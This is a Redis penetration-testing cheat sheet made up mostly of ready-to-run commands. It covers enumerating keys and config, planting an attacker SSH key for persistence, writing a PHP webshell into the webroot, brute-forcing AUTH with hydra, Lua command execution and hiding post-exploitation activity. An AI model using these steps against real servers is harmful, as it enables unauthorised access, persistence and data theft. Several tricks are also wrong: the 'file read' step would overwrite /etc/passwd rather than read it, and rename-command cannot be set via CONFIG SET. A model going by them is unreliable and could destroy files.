###  Enumeration / Recon

```bash
# Connect (default port 6379)
redis-cli -h <IP> -p 6379

# If auth required
redis-cli -h <IP> -p <PORT> -a <PASSWORD>

# Check if protected mode / version
INFO
INFO server
INFO keyspace

# Get all keys
KEYS *
SCAN 0

# Dump sample values
GET <key>
LRANGE <list> 0 -1
SMEMBERS <set>
HGETALL <hash>

# List databases
CONFIG GET databases
SELECT <db_number>

# See config
CONFIG GET *
```

---

###  Exploitation Tricks

#### 1. **Write to File (RCE / Persistence)**

```bash
# Set an SSH public key for persistence (requires file write perms)
SET crackme "\n\nssh-rsa AAAAB3Nz... attacker@host\n\n"
CONFIG SET dir /var/lib/redis/.ssh/
CONFIG SET dbfilename "authorized_keys"
SAVE
```

```bash
# Or drop a webshell if Redis user has webroot write perms
SET payload "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename "shell.php"
SAVE
```

---

#### 2. **Crack Redis AUTH password**

```bash
# Try common weak passwords
hydra -P /opt/rockyou.txt -s 6379 redis://<IP>
```

---

#### 3. **File Read (Poison backup path)**

```bash
# Abuse CONFIG SET dir/dbfilename to read files
CONFIG SET dir /etc/
CONFIG SET dbfilename passwd
SAVE
```

Now `GET passwd` returns `/etc/passwd`.

---

#### 4. **Lua Sandbox Escape**

```bash
EVAL 'os.execute("id")' 0
EVAL 'io.popen("cat /etc/passwd"):read("*a")' 0
```

---

###  Privilege Escalation

- Check SUID/permissions of `redis` user
- If running as root, file write → instant privesc (drop to `/root/.ssh/authorized_keys`).
- Misconfig (no AUTH, full CONFIG) = free RCE.

---

###  Post-Exploitation

```bash
# Check connected clients
CLIENT LIST

# Rename commands to avoid detection
CONFIG SET rename-command FLUSHALL ""
```

---

### One-Liner: Dump All

```bash
redis-cli -h <IP> -p <PORT> --raw keys '*' | xargs -n1 redis-cli -h <IP> -p <PORT> get
```

---

This is the **essential pentest flow**:

1. **Connect** → check for AUTH or not.
2. **Enumerate keys/config**.
3. **Exploit write → RCE/persistence**.
4. **Escalate** if Redis runs as root.

---
